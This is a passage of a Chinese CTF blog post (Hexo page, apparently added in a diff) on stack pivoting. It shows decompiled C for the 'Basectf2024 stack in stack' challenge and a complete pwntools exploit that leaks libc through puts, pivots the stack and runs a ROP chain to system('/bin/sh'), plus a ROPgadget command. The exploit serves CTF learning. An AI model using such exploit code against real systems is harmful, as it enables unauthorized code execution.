class="string">b&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="Basectf2024-stack-in-stack"><a href="#Basectf2024-stack-in-stack" class="headerlink" title="Basectf2024 stack in stack"></a>Basectf2024 stack in stack</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_4011FE(a1, a2, a3);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It looks like something fell off mick0960.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;An error occurred while reading!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里主要利用了栈迁移，进行第一次泄露puts的地址，并且返回main。再次进行栈迁移，执行ROP链getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;It looks like something fell off mick0960.\n&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">main_addr = <span class="number">0x40124a</span></span><br><span class="line">leave = <span class="number">0x4012f2</span></span><br><span class="line">sub_4011C6 = <span class="number">0x4011dd</span>  <span class="comment">#泄露puts的地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(sub_4011C6) + p64(<span class="number">0</span>) + p64(main_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> </span><br><span class="line">payload += p64(buf_addr) + p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause() </span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;It looks like something fell off mick0960.\n&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause() </span></span><br><span class="line"> </span><br><span class="line">system = libc_base + libc.sym.system</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span> <span class="comment">#在libc.so.6找</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(buf_addr) + p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot;  #查找pop_rdi的偏移</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>linkpwn
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/" title="栈迁移专题学习">http://linkpwn.github.io/2025/06/28/栈迁移专题学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/06/18/linkpwn%E7%9A%84%E5%B0%8F%E9%87%91%E5%BA%93/" rel="prev" title="linkpwn的小金库">
+      <i class="fa fa-chevron-left"></i> linkpwn的小金库
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/" rel="next" title="sandbox专题学习">
+      sandbox专题学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">栈迁移专题学习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.1.</span> <span class="nav-text">原理学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#32%E4%BD%8D"><span class="nav-number">1.1.1.</span> <span class="nav-text">32位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#64%E4%BD%8D"><span class="nav-number">1.1.2.</span> <span class="nav-text">64位</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-number">1.2.</span> <span class="nav-text">实例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#32%E4%BD%8D-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">32位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#64%E4%BD%8D-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">64位</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%B0%E8%BF%99%E9%87%8C%E5%9F%BA%E6%9C%AC%E5%B0%B1%E6%80%BB%E7%BB%93%E7%BB%93%E6%9D%9F%E5%95%A6%EF%BD%9E%F0%9F%8C%88%E2%9C%A8%F0%9F%98%8A"><span class="nav-number">2.</span> <span class="nav-text">栈迁移到这里基本就总结结束啦～🌈✨😊</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN1"><span class="nav-number">2.0.1.</span> <span class="nav-text">[Black Watch 入群题]PWN1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gyctf-2020-borrowstack"><span class="nav-number">2.0.2.</span> <span class="nav-text">gyctf_2020_borrowstack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Basectf2024-stack-in-stack"><span class="nav-number">2.0.3.</span> <span class="nav-text">Basectf2024 stack in stack</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="linkpwn"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">linkpwn</p>
+  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">linkpwn</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/clickshowtext.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
